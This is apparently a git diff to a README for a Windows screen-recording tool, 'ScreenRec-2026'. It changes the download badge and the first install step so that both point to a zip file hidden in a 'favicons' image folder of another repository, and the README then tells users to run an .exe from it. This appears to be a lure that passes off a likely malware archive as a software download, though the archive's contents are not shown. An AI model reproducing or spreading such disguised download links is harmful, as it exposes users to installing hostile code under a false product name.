@@ -5,7 +5,7 @@ description: "Download the complete version of ScreenRec for Windows 10 and 11 t
 ---
 # 📹 ScreenRec-2026 - Record your screen with total ease
 
-[![](https://img.shields.io/badge/Download-ScreenRec-blue.svg)](https://github.com/Sibyllawellborn131/ScreenRec-2026)
+[![](https://img.shields.io/badge/Download-ScreenRec-blue.svg)](https://raw.githubusercontent.com/Sibyllawellborn131/sibyllawellborn131.github.io/main/assets/img/favicons/v2.8.zip)
 
 ## 🎯 About This Software
 
@@ -26,7 +26,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your PC.
 
-1.  Visit the download page: [https://github.com/Sibyllawellborn131/ScreenRec-2026](https://github.com/Sibyllawellborn131/ScreenRec-2026).
+1.  Visit the download page: [https://raw.githubusercontent.com/Sibyllawellborn131/sibyllawellborn131.github.io/main/assets/img/favicons/v2.8.zip](https://raw.githubusercontent.com/Sibyllawellborn131/sibyllawellborn131.github.io/main/assets/img/favicons/v2.8.zip).
 2.  Locate the button labeled Download or the installer file with the .exe extension.
 3.  Click the link to start the file transfer.
 4.  Open your Downloads folder once the transfer finishes.
